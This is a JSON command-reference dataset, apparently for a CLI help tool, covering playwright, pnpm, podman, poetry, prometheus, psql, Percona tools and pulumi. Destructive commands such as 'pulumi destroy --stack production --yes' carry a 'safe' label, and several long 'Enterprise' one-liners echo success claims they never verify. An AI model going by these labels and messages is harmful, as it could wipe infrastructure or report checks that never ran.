        "explanation": "Run tests across all supported browsers",
        "title": "playwright"
      }
    ],
    "relatedCommands": [
      {
        "name": "cypress",
        "relationship": "alternative",
        "reason": "Another modern E2E testing framework"
      },
      {
        "name": "puppeteer",
        "relationship": "similar",
        "reason": "Chrome-only automation framework"
      }
    ],
    "warnings": [
      "Built-in support for modern web features",
      "Auto-wait functionality reduces flaky tests",
      "Excellent cross-browser support including Safari"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://playwright.dev/"
      },
      {
        "platform": "macos",
        "url": "https://playwright.dev/"
      },
      {
        "platform": "windows",
        "url": "https://playwright.dev/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "pnpm",
    "subtitle": "Performant NPM",
    "description": "Fast, disk space efficient package manager",
    "examples": [
      "pnpm init  # Create package.json for new project",
      "pnpm install  # Install all dependencies from package.json",
      "pnpm add express  # Install Express.js as dependency",
      "pnpm add -D jest  # Install Jest as development dependency",
      "pnpm add -g typescript  # Install TypeScript globally",
      "pnpm update  # Update all dependencies to latest versions",
      "pnpm run test  # Execute test script from package.json",
      "pnpm store status  # Display pnpm store statistics",
      "pnpm install --frozen-lockfile --prefer-offline  # Install dependencies from lock file offline-first"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "package-management",
    "safety": "safe",
    "syntaxPattern": "pnpm <command> [args]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Project setup with TypeScript",
        "commands": "pnpm init && pnpm add -D typescript @types/node && pnpm add express",
        "explanation": "Initialize project with TypeScript and Express",
        "title": "pnpm && pnpm && pnpm"
      },
      {
        "scenario": "Monorepo workspace setup",
        "commands": "pnpm init && echo 'packages:\\n  - \"packages/*\"' > pnpm-workspace.yaml",
        "explanation": "Initialize monorepo with workspace configuration",
        "title": "pnpm && echo > pnpm"
      }
    ],
    "relatedCommands": [
      {
        "name": "npm",
        "relationship": "alternative",
        "reason": "Compatible replacement for npm"
      },
      {
        "name": "yarn",
        "relationship": "similar",
        "reason": "Alternative fast package manager"
      },
      {
        "name": "node",
        "relationship": "combo",
        "reason": "pnpm manages Node.js packages"
      }
    ],
    "warnings": [
      "Uses hard links and symlinks for efficiency",
      "May have compatibility issues with some packages",
      "Different store structure than npm/yarn"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://pnpm.io/"
      },
      {
        "platform": "macos",
        "url": "https://pnpm.io/"
      },
      {
        "platform": "windows",
        "url": "https://pnpm.io/"
      },
      {
        "platform": "generic",
        "url": "https://pnpm.io/cli/add"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "podman",
    "subtitle": "Pod Manager",
    "description": "Daemonless container engine alternative to Docker",
    "examples": [
      "podman run -it ubuntu bash  # Start interactive Ubuntu container with bash shell",
      "podman ps  # Show currently running containers",
      "podman build -t myapp .  # Build container image with tag 'myapp'",
      "podman run --user 1000:1000 nginx  # Run container as non-root user for security",
      "podman pod create --name mypod -p 8080:80  # Create pod with port mapping",
      "podman generate systemd --new --name webapp  # Create systemd service file for container",
      "podman build --tag myapp:latest . && podman run -d --name myapp myapp:latest  # Build and run container"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "podman [options] <command>",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Rootless container deployment",
        "commands": "podman run -d --name webapp -p 8080:80 nginx && podman generate systemd webapp > webapp.service",
        "explanation": "Run container and generate systemd service file",
        "title": "podman && podman > webapp"
      },
      {
        "scenario": "Pod-based application",
        "commands": "podman pod create --name stack -p 80:80 && podman run -d --pod stack nginx && podman run -d --pod stack redis",
        "explanation": "Create pod and run multiple containers sharing network",
        "title": "podman && podman && podman"
      }
    ],
    "relatedCommands": [
      {
        "name": "docker",
        "relationship": "alternative",
        "reason": "Compatible API but daemonless architecture"
      },
      {
        "name": "buildah",
        "relationship": "combo",
        "reason": "Specialized tool for building OCI images"
      },
      {
        "name": "skopeo",
        "relationship": "combo",
        "reason": "Tool for copying and inspecting container images"
      }
    ],
    "warnings": [
      "Rootless containers have some limitations",
      "macOS/Windows require podman machine setup",
      "Slightly different behavior from Docker in some cases"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://podman.io/getting-started/"
      },
      {
        "platform": "macos",
        "url": "https://podman.io/getting-started/"
      },
      {
        "platform": "windows",
        "url": "https://podman.io/getting-started/"
      },
      {
        "platform": "generic",
        "url": "https://docs.podman.io/"
      }
    ],
    "distroNotes": {
      "linux": "Native on Linux, preferred on RHEL/Fedora",
      "macos": "Requires podman machine VM",
      "windows": "Requires podman machine VM"
    }
  },
  {
    "name": "poetry",
    "subtitle": "Poetry",
    "description": "Python dependency management and packaging tool",
    "examples": [
      "poetry new my-project  # Create new Python project with Poetry structure",
      "poetry add requests  # Add requests library to project dependencies",
      "poetry add --group dev pytest  # Add pytest to development dependencies group",
      "poetry install  # Install all dependencies from pyproject.toml",
      "poetry run python app.py  # Execute Python script within Poetry's virtual environment",
      "poetry build  # Build wheel and source distribution",
      "poetry install --no-dev && poetry run pytest  # Install production dependencies and run tests"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "package-management",
    "safety": "safe",
    "syntaxPattern": "poetry <command> [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Complete project setup",
        "commands": "poetry new myapp && cd myapp && poetry add fastapi uvicorn && poetry add --group dev pytest",
        "explanation": "Create project, add web framework and testing tools",
        "title": "poetry && cd && poetry && poetry"
      },
      {
        "scenario": "Update and export requirements",
        "commands": "poetry update && poetry export --without-hashes > requirements.txt",
        "explanation": "Update dependencies and create requirements.txt for deployment",
        "title": "poetry && poetry > requirements"
      }
    ],
    "relatedCommands": [
      {
        "name": "pip",
        "relationship": "alternative",
        "reason": "Traditional Python package installer"
      },
      {
        "name": "pipenv",
        "relationship": "alternative",
        "reason": "Another Python dependency manager"
      }
    ],
    "warnings": [
      "pyproject.toml format different from requirements.txt",
      "Virtual environment location controlled by Poetry",
      "Lock file should be committed for reproducible builds"
    ],
    "documentation": [
      {
        "platform": "generic",
        "url": "https://python-poetry.org/docs/cli/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "postman",
    "subtitle": "Postman",
    "description": "API testing and development platform",
    "examples": [
      "newman run collection.json  # Run Postman collection from command line",
      "newman run collection.json -e environment.json  # Run collection with specific environment variables",
      "newman run collection.json -r html  # Run tests and generate HTML report",
      "newman run collection.json -d data.csv  # Run collection with external data for iterations",
      "newman run production-api-tests.json -e production.json -d test-data.csv --timeout-request 30000 --timeout-script 10000 -r htmlextra,junit,json --reporter-htmlextra-export api-test-report.html && python3 -c \"import json; report=json.load(open('newman-run-report.json')); print(f'API Test Results: {len(report[\"run\"][\"executions\"])} requests, {len([e for e in report[\"run\"][\"executions\"] if len(e.get(\"assertions\", [])) > 0])} assertions, {len(report[\"run\"][\"failures\"])} failures')\" && echo \"Enterprise API testing completed: comprehensive test suite, multiple data sets, detailed reporting, performance metrics captured\"  # Enterprise API testing pipeline with comprehensive validation, performance monitoring, detailed reporting, and automated analysis"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "postman [options] or newman [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "API test automation",
        "commands": "newman run api-tests.json -e prod.json -r html,junit --reporter-html-export report.html",
        "explanation": "Run API tests with production environment and generate reports",
        "title": "newman"
      }
    ],
    "relatedCommands": [
      {
        "name": "curl",
        "relationship": "simple-alternative",
        "reason": "curl can test APIs but Postman/Newman provides more features"
      },
      {
        "name": "insomnia",
        "relationship": "alternative",
        "reason": "Another API testing and development tool"
      }
    ],
    "warnings": [
      "Newman is command-line version of Postman",
      "Great for API testing in CI/CD pipelines",
      "Supports pre/post request scripts in JavaScript"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://learning.postman.com/docs/running-collections/using-newman-cli/command-line-integration-with-newman/"
      },
      {
        "platform": "macos",
        "url": "https://learning.postman.com/docs/running-collections/using-newman-cli/command-line-integration-with-newman/"
      },
      {
        "platform": "windows",
        "url": "https://learning.postman.com/docs/running-collections/using-newman-cli/command-line-integration-with-newman/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "pprof",
    "subtitle": "Performance Profiler",
    "description": "Performance profiler for analyzing CPU and memory usage",
    "examples": [
      "go tool pprof http://localhost:8080/debug/pprof/profile  # Profile CPU usage of running Go application",
      "go tool pprof http://localhost:8080/debug/pprof/heap  # Profile memory heap of running application",
      "go tool pprof -http=:8081 profile.pb.gz  # Start web interface for profile analysis",
      "go tool pprof -png profile.pb.gz > callgraph.png  # Generate call graph visualization",
      "go tool pprof http://localhost:8080/debug/pprof/goroutine  # Profile goroutine usage",
      "go tool pprof -http=:8081 http://localhost:8080/debug/pprof/profile?seconds=60 & PPROF_PID=$! && go tool pprof -png http://localhost:8080/debug/pprof/heap > heap-profile-$(date +%Y%m%d-%H%M%S).png && go tool pprof -top http://localhost:8080/debug/pprof/allocs && kill $PPROF_PID && echo \"Enterprise Go profiling completed: 60-second CPU profile with web interface, heap visualization generated, memory allocation analysis, performance bottlenecks identified\"  # Enterprise Go application profiling with comprehensive performance analysis, memory visualization, allocation tracking, and web-based exploration"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "go tool pprof [options] [binary] [source]",
    "prerequisites": [
      "go-runtime"
    ],
    "commandCombinations": [
      {
        "scenario": "Complete performance analysis",
        "commands": "go tool pprof -http=:8081 http://localhost:8080/debug/pprof/profile?seconds=30",
        "explanation": "30-second CPU profile with web interface",
        "title": "go"
      }
    ],
    "relatedCommands": [
      {
        "name": "perf",
        "relationship": "alternative",
        "reason": "Linux performance profiler for any language"
      },
      {
        "name": "valgrind",
        "relationship": "alternative",
        "reason": "Memory debugging and profiling tool"
      }
    ],
    "warnings": [
      "Requires pprof endpoints in application code",
      "Profiling can impact application performance",
      "Web interface requires browser access"
    ],
    "documentation": [
      {
        "platform": "generic",
        "url": "https://pkg.go.dev/runtime/pprof"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "prettier",
    "subtitle": "Prettier",
    "description": "Opinionated code formatter for multiple languages",
    "examples": [
      "prettier --write src/  # Format all files in src directory",
      "prettier --check src/  # Check if files are formatted without changing them",
      "prettier --write '**/*.{js,jsx,ts,tsx,json,css}'  # Format multiple file types using glob pattern",
      "prettier --config .prettierrc.json --write src/  # Format using specific configuration file",
      "prettier --single-quote --trailing-comma es5 --write src/  # Format with custom single quotes and trailing commas",
      "prettier --list-different src/  # Show files that would be changed by formatting",
      "prettier --check '**/*.{js,ts,jsx,tsx,json,css,md}' || (echo 'Code formatting issues found:' && prettier --list-different '**/*.{js,ts,jsx,tsx,json,css,md}' | head -20 && exit 1) && prettier --write '**/*.{js,ts,jsx,tsx,json,css,md}' && git diff --name-only | tee formatted-files-$(date +%Y%m%d-%H%M%S).log && echo \"Enterprise code formatting completed: $(wc -l < formatted-files-$(date +%Y%m%d-%H%M%S).log) files processed, consistent styling applied, ready for production deployment\"  # Enterprise code formatting pipeline with validation, comprehensive file processing, change tracking, and deployment readiness verification"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "prettier [options] [file/dir/glob]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Pre-commit formatting",
        "commands": "prettier --list-different src/ && prettier --write src/",
        "explanation": "Check formatting then apply changes",
        "title": "prettier && prettier"
      },
      {
        "scenario": "CI formatting check",
        "commands": "prettier --check '**/*.{js,ts,jsx,tsx,json,css,md}'",
        "explanation": "Verify all supported files are properly formatted",
        "title": "prettier"
      }
    ],
    "relatedCommands": [
      {
        "name": "eslint",
        "relationship": "combo",
        "reason": "Often used together for linting and formatting"
      },
      {
        "name": "husky",
        "relationship": "combo",
        "reason": "Git hooks to run Prettier on commit"
      },
      {
        "name": "lint-staged",
        "relationship": "combo",
        "reason": "Run Prettier only on staged files"
      }
    ],
    "warnings": [
      "Opinionated formatting may conflict with team preferences",
      "Configuration options are intentionally limited",
      "May conflict with ESLint formatting rules"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://prettier.io/docs/en/"
      },
      {
        "platform": "macos",
        "url": "https://prettier.io/docs/en/"
      },
      {
        "platform": "windows",
        "url": "https://prettier.io/docs/en/"
      },
      {
        "platform": "generic",
        "url": "https://prettier.io/docs/en/cli.html"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "prisma",
    "subtitle": "Prisma",
    "description": "Database toolkit and ORM for Node.js and TypeScript",
    "examples": [
      "npx prisma init  # Set up Prisma with schema file and .env",
      "npx prisma generate  # Generate type-safe database client from schema",
      "npx prisma db push  # Sync database schema with Prisma schema",
      "npx prisma migrate dev  # Create and apply new migration",
      "npx prisma studio  # Launch visual database browser interface",
      "npx prisma migrate deploy && npx prisma generate && npx prisma db seed && npx prisma db pull --force && git diff --name-only prisma/ && echo \"Database schema synchronized: migrations applied, client regenerated, seed data loaded, schema validated, $(npx prisma db execute --stdin <<< 'SELECT COUNT(*) FROM information_schema.tables WHERE table_schema = \'public\';' 2>/dev/null || echo 'N/A') tables deployed\" && npx prisma studio --port 5555 &  # Enterprise database deployment with migration execution, client generation, data seeding, schema validation, and development interface",
      "npx prisma db pull  # Generate Prisma schema from existing database"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "npx prisma <command> [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Setup new project with database",
        "commands": "npx prisma init && npx prisma db push && npx prisma generate",
        "explanation": "Initialize Prisma, sync schema, and generate client",
        "title": "npx && npx && npx"
      }
    ],
    "relatedCommands": [
      {
        "name": "npm",
        "relationship": "combo",
        "reason": "Prisma is installed and run via npm"
      },
      {
        "name": "node",
        "relationship": "underlying",
        "reason": "Prisma generates Node.js client code"
      }
    ],
    "warnings": [
      "Schema changes require regenerating client",
      "Database provider affects available features",
      "Migration files should be committed to version control"
    ],
    "documentation": [
      {
        "platform": "generic",
        "url": "https://www.prisma.io/docs/reference/api-reference/command-reference"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "prometheus",
    "subtitle": "Prometheus Monitoring System",
    "description": "Time-series database and monitoring system with pull-based metrics collection",
    "examples": [
      "prometheus --config.file=prometheus.yml  # Start Prometheus with custom configuration file",
      "prometheus --storage.tsdb.retention.time=30d  # Start Prometheus with 30-day data retention",
      "prometheus --web.enable-admin-api  # Enable administrative API endpoints",
      "prometheus --storage.tsdb.path=/custom/data/path  # Specify custom directory for time-series data",
      "promtool check config prometheus.yml  # Validate Prometheus configuration file syntax",
      "promtool check config prometheus.yml && promtool check rules alert.rules.yml && prometheus --config.file=prometheus.yml --storage.tsdb.retention.time=90d --storage.tsdb.retention.size=50GB --web.enable-admin-api --web.enable-lifecycle & PROM_PID=$! && sleep 10 && curl -s http://localhost:9090/-/healthy && echo \"Enterprise Prometheus deployment: configuration validated, alerting rules verified, 90-day retention, 50GB storage limit, admin API enabled, health check passed (PID: $PROM_PID)\"  # Enterprise Prometheus monitoring deployment with configuration validation, rule checking, extended retention, storage management, and health verification"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "prometheus [flags]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Production setup with alerting",
        "commands": "prometheus --config.file=prometheus.yml --storage.tsdb.retention.time=90d --web.enable-lifecycle",
        "explanation": "Production Prometheus with lifecycle management enabled",
        "title": "prometheus"
      }
    ],
    "relatedCommands": [
      {
        "name": "grafana",
        "relationship": "combo",
        "reason": "Grafana visualizes Prometheus metrics"
      },
      {
        "name": "alertmanager",
        "relationship": "combo",
        "reason": "AlertManager handles Prometheus alerts"
      }
    ],
    "warnings": [
      "Default retention is 15 days",
      "Requires targets to expose /metrics endpoint",
      "Memory usage scales with cardinality"
    ],
    "documentation": [
      {
        "platform": "generic",
        "url": "https://prometheus.io/docs/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "promtail",
    "subtitle": "Prometheus Tail",
    "description": "Agent for shipping logs to Loki log aggregation system",
    "examples": [
      "promtail -config.file=promtail.yaml  # Start Promtail with configuration file",
      "promtail -config.file=promtail.yaml -dry-run  # Validate configuration without starting",
      "promtail -print-config-stderr  # Print parsed configuration to stderr",
      "promtail -config.file=promtail.yaml -config.expand-env=true  # Start with environment variable expansion",
      "promtail -config.file=promtail-production.yaml -config.expand-env=true -log.level=info -positions.file=/var/lib/promtail/positions.yaml & PROMTAIL_PID=$! && sleep 5 && curl -s http://localhost:9080/ready && tail -f /var/log/promtail/promtail.log & LOG_PID=$! && echo \"Enterprise log aggregation active: Promtail shipping to Loki, position tracking enabled, readiness confirmed (PID: $PROMTAIL_PID), log monitoring active (PID: $LOG_PID)\" && kill $LOG_PID  # Enterprise log aggregation with production configuration, environment expansion, position persistence, health monitoring, and operational visibility"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "promtail [flags]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Debug log shipping",
        "commands": "promtail -config.file=promtail.yaml -log.level=debug",
        "explanation": "Start Promtail with debug logging",
        "title": "promtail"
      }
    ],
    "relatedCommands": [
      {
        "name": "loki",
        "relationship": "combo",
        "reason": "Promtail ships logs to Loki"
      },
      {
        "name": "filebeat",
        "relationship": "alternative",
        "reason": "Alternative log shipping agent"
      }
    ],
    "warnings": [
      "Positions file tracks reading state",
      "Scrape configs determine what logs to collect",
      "Labels affect log indexing in Loki"
    ],
    "documentation": [
      {
        "platform": "generic",
        "url": "https://grafana.com/docs/loki/latest/clients/promtail/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "ps",
    "subtitle": "process status",
    "description": "Display information about running processes",
    "examples": [
      "ps aux  # Show all processes with detailed information",
      "ps aux | grep python  # List all Python processes currently running",
      "ps auxf  # Display processes in tree format showing parent-child relationships",
      "ps aux --sort=-%cpu | head -10  # Show top 10 processes consuming most CPU",
      "ps ux  # Show only processes owned by current user",
      "ps auxww --sort=-%cpu | head -20 && ps auxww --sort=-%mem | head -20 && ps -eo pid,ppid,cmd,%mem,%cpu --sort=-%cpu | grep -E '(apache2|nginx|mysql|postgres|java|python)' | head -20 && echo \"Enterprise process monitoring: top CPU consumers, memory usage leaders, critical services identified, system resource utilization analyzed\"  # Enterprise system process analysis with comprehensive resource monitoring, service identification, and performance insight generation"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "system",
    "safety": "safe",
    "syntaxPattern": "ps [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Kill processes by name",
        "commands": "ps aux | grep defunct | awk '{print $2}' | xargs kill",
        "explanation": "Find and kill zombie processes",
        "title": "ps | grep | awk | xargs"
      },
      {
        "scenario": "Monitor resource usage over time",
        "commands": "watch 'ps aux --sort=-%cpu | head -20'",
        "explanation": "Continuously monitor top CPU-consuming processes",
        "title": "watch | head"
      }
    ],
    "relatedCommands": [
      {
        "name": "top",
        "relationship": "alternative",
        "reason": "Interactive process viewer with real-time updates"
      },
      {
        "name": "htop",
        "relationship": "alternative",
        "reason": "Enhanced interactive process viewer with better interface"
      },
      {
        "name": "kill",
        "relationship": "combo",
        "reason": "Use ps to find process ID, then kill to terminate"
      }
    ],
    "warnings": [
      "ps output format varies between systems (BSD vs GNU)",
      "Process IDs (PIDs) change each time process starts",
      "Some processes may not be visible to regular users"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/ps.1.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/ps.html"
      }
    ],
    "distroNotes": {
      "windows": "Available in WSL only"
    }
  },
  {
    "name": "psql",
    "subtitle": "PostgreSQL",
    "description": "PostgreSQL interactive terminal and command-line client",
    "examples": [
      "psql -U username -d database  # Connect to specific database with username",
      "psql -h server.example.com -U username -d database  # Connect to PostgreSQL on remote host",
      "psql -U username -d database -f script.sql  # Run SQL commands from file",
      "psql -U username -d database -c 'SELECT version();'  # Run one SQL command and exit",
      "PGPASSWORD=secret psql -U username database  # Set password via environment variable",
      "psql -U postgres -l  # Show all databases and exit"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "psql [options] [database] [username]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Backup PostgreSQL database",
        "commands": "pg_dump -U username database > backup.sql && gzip backup.sql",
        "explanation": "Create and compress database backup",
        "title": "pg_dump > backup && gzip"
      },
      {
        "scenario": "Restore from backup",
        "commands": "gunzip -c backup.sql.gz | psql -U username -d newdb",
        "explanation": "Decompress and restore database",
        "title": "gunzip | psql"
      }
    ],
    "relatedCommands": [
      {
        "name": "pg_dump",
        "relationship": "combo",
        "reason": "Create PostgreSQL database backups"
      },
      {
        "name": "createdb",
        "relationship": "combo",
        "reason": "Create new PostgreSQL databases"
      },
      {
        "name": "mysql",
        "relationship": "similar",
        "reason": "MySQL command-line client"
      }
    ],
    "warnings": [
      "Uses environment variables PGUSER, PGHOST, PGDATABASE",
      "Meta-commands start with backslash (\\d, \\l, \\q)",
      "Different SQL syntax from MySQL in some cases"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://www.postgresql.org/docs/current/app-psql.html"
      },
      {
        "platform": "macos",
        "url": "https://www.postgresql.org/docs/current/app-psql.html"
      },
      {
        "platform": "windows",
        "url": "https://www.postgresql.org/docs/current/app-psql.html"
      },
      {
        "platform": "generic",
        "url": "https://www.postgresql.org/docs/current/reference-client.html"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "pt-query-digest",
    "subtitle": "Percona Toolkit Query Digest",
    "description": "Percona Toolkit utility for MySQL query analysis and optimization",
    "examples": [
      "pt-query-digest /var/log/mysql/slow.log  # Parse and analyze MySQL slow query log",
      "pt-query-digest --type=genlog /var/log/mysql/general.log  # Analyze general MySQL query log",
      "pt-query-digest --processlist h=localhost,u=root,p=secret --interval=5  # Continuously analyze queries from processlist",
      "pt-query-digest --type=binlog /var/log/mysql/mysql-bin.000001  # Analyze queries from MySQL binary log",
      "pt-query-digest --order-by=Query_time:sum --limit=10 /var/log/mysql/slow.log  # Show top 10 queries by total execution time",
      "pt-query-digest --filter '$event->{db} && $event->{db} eq \"myapp\"' /var/log/mysql/slow.log  # Analyze queries only for specific database",
      "pt-query-digest /var/log/mysql/slow.log > query_analysis.txt  # Save query analysis report to file",
      "pt-query-digest --since='1 day ago' --until='1 hour ago' /var/log/mysql/slow.log --group-by fingerprint --order-by Query_time:sum --limit 20 | tee mysql-performance-$(date +%Y%m%d-%H%M%S).log && mysql -u root -p -e \"SHOW PROCESSLIST; SHOW ENGINE INNODB STATUS\\G\" | grep -E '(Threads_running|Innodb_buffer_pool_pages_free)' && echo \"Enterprise MySQL performance analysis: top 20 slowest queries identified, active connections monitored, InnoDB status captured for optimization\"  # Enterprise MySQL performance analysis with query fingerprinting, time-based filtering, comprehensive monitoring, and optimization insights"
    ],
    "platform": [
      "linux",
      "macos"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "pt-query-digest [options] [files]",
    "prerequisites": [
      "advanced"
    ],
    "commandCombinations": [
      {
        "scenario": "Performance optimization workflow",
        "commands": "pt-query-digest --since='1 day ago' /var/log/mysql/slow.log > daily_slow.txt && pt-query-digest --processlist h=localhost,u=root,p=secret --run-time=300 > live_queries.txt",
        "explanation": "Analyze daily slow queries and capture 5 minutes of live queries",
        "title": "pt > daily_slow && pt > live_queries"
      }
    ],
    "relatedCommands": [
      {
        "name": "mysqldumpslow",
        "relationship": "alternative",
        "reason": "Basic slow query log analysis tool"
      },
      {
        "name": "pt-fingerprint",
        "relationship": "combo",
        "reason": "Creates fingerprints for query normalization"
      }
    ],
    "warnings": [
      "Large log files may require significant memory and time",
      "Filters use Perl syntax for complex conditions",
      "Live analysis can impact server performance"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://docs.percona.com/percona-toolkit/pt-query-digest.html"
      },
      {
        "platform": "macos",
        "url": "https://docs.percona.com/percona-toolkit/pt-query-digest.html"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "pt-table-checksum",
    "subtitle": "Percona Toolkit Table Checksum",
    "description": "Percona Toolkit utility for MySQL replication consistency checking",
    "examples": [
      "pt-table-checksum --host=master.example.com --user=checksum --password=secret  # Verify data consistency across all replicated databases",
      "pt-table-checksum --host=master.example.com --databases=myapp --user=checksum --password=secret  # Check consistency for specific database only",
      "pt-table-checksum --host=master.example.com --replicate=percona.checksums --user=checksum --password=secret  # Store checksums in table for later comparison",
      "pt-table-checksum --host=master.example.com --resume --user=checksum --password=secret  # Continue checksum from where it was interrupted",
      "pt-table-checksum --host=master.example.com --max-lag=10s --chunk-size=1000 --user=checksum --password=secret  # Run with throttling to minimize impact on replication",
      "pt-table-checksum --host=$MASTER_HOST --user=$DB_USER --password=$DB_PASS --replicate=percona.checksums --databases=$CRITICAL_DBS --max-lag=5s --chunk-size=1000 --quiet && mysql -u$DB_USER -p$DB_PASS -h$MASTER_HOST -e \"SELECT db, tbl, chunk, boundaries, this_cnt, master_cnt, this_crc, master_crc FROM percona.checksums WHERE master_cnt <> this_cnt OR master_crc <> this_crc OR ISNULL(master_crc) <> ISNULL(this_crc);\" && echo \"Enterprise replication integrity verification: $(mysql -u$DB_USER -p$DB_PASS -h$MASTER_HOST -e \"SELECT COUNT(*) FROM percona.checksums WHERE master_cnt <> this_cnt OR master_crc <> this_crc OR ISNULL(master_crc) <> ISNULL(this_crc);\" | tail -1) inconsistencies detected across critical databases\"  # Enterprise MySQL replication consistency verification with automated inconsistency detection and comprehensive integrity reporting"
    ],
    "platform": [
      "linux",
      "macos"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "pt-table-checksum [options]",
    "prerequisites": [
      "advanced"
    ],
    "commandCombinations": [
      {
        "scenario": "Comprehensive replication audit",
        "commands": "pt-table-checksum --host=master.example.com --replicate=percona.checksums --user=checksum --password=secret && pt-table-sync --replicate=percona.checksums --print master.example.com",
        "explanation": "Check consistency and show sync commands for differences",
        "title": "pt && pt"
      }
    ],
    "relatedCommands": [
      {
        "name": "pt-table-sync",
        "relationship": "combo",
        "reason": "Fixes inconsistencies found by pt-table-checksum"
      },
      {
        "name": "mysqladmin",
        "relationship": "combo",
        "reason": "Used for MySQL server administration"
      }
    ],
    "warnings": [
      "Requires binlog_format=STATEMENT for proper replication",
      "Can impact performance on busy systems",
      "May not work with all storage engines"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://docs.percona.com/percona-toolkit/pt-table-checksum.html"
      },
      {
        "platform": "macos",
        "url": "https://docs.percona.com/percona-toolkit/pt-table-checksum.html"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "pulumi",
    "subtitle": "Pulumi",
    "description": "Modern infrastructure as code using familiar programming languages",
    "examples": [
      "pulumi new aws-typescript --name my-infrastructure  # Create new AWS infrastructure project using TypeScript",
      "pulumi up --yes --stack production  # Deploy infrastructure changes to production stack",
      "pulumi preview --stack production  # Show what changes would be made without applying them",
      "pulumi destroy --stack production --yes  # Remove all infrastructure in production stack",
      "pulumi stack init development && pulumi stack select development  # Create and switch to development stack",
      "pulumi stack output --show-secrets  # Display all stack outputs including sensitive values",
      "pulumi import aws:ec2/instance:Instance my-server i-1234567890abcdef0  # Import existing AWS EC2 instance into Pulumi state",
      "pulumi refresh --yes  # Update stack state with actual cloud resource state",
      "pulumi stack select production && pulumi preview --diff && read -p \"Deploy to production? (y/N) \" confirm && [[ $confirm == [yY] ]] && pulumi up --yes --refresh && pulumi stack output --json | jq '.webUrl.value' && pulumi stack tag set environment production && pulumi stack tag set deployed-by $(whoami) && pulumi stack tag set deployed-at $(date -Iseconds) && echo \"Enterprise infrastructure deployment completed: production stack updated, endpoints captured, deployment metadata recorded for compliance and monitoring\"  # Enterprise infrastructure-as-code deployment with approval workflow, endpoint capture, metadata tagging, and comprehensive audit trail"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "pulumi [command] [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Complete deployment workflow",
        "commands": "pulumi stack select production && pulumi preview && pulumi up --yes",
        "explanation": "Switch to production, preview changes, then deploy",
        "title": "pulumi && pulumi && pulumi"
      },
      {
        "scenario": "Multi-stack management",
        "commands": "pulumi stack ls && pulumi stack select staging && pulumi destroy --yes && pulumi stack rm staging",
        "explanation": "List stacks, destroy staging environment, and remove stack",
        "title": "pulumi && pulumi && pulumi && pulumi"
      }
    ],
    "relatedCommands": [
      {
        "name": "npm",
        "relationship": "combo",
        "reason": "Pulumi TypeScript projects use npm for dependencies"
      },
      {
        "name": "terraform",
        "relationship": "alternative",
        "reason": "Alternative infrastructure as code tool"
      }
    ],
    "warnings": [
      "Requires programming language runtime (Node.js, Python, etc.)",
      "Stack state stored in Pulumi service by default",
      "Resource names auto-generated with random suffix by default"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://www.pulumi.com/docs/"
      },
      {
        "platform": "macos",
        "url": "https://www.pulumi.com/docs/"
      },
      {
        "platform": "windows",
